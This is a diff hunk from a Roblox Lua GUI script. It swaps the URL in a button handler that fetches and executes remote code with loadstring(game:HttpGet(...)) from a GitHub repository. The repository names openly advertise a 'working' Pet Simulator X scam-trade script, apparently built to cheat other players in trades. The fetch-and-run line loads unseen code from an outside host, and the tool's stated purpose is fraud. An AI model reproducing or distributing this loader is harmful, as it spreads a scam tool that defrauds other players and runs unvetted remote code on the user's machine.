@@ -33,7 +33,7 @@ TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextButton.TextSize = 17.000
 TextButton.TextWrapped = true
 TextButton.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Jack92738/PetSimScamTradeScriptSource/main/Private", true))() 
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Jack92738/PETSIMXWORKINGSCAMTRADEPRIVATE/main/PRIVATEWORKING"))() 
 end)
 
 TextLabel.Parent = Frame
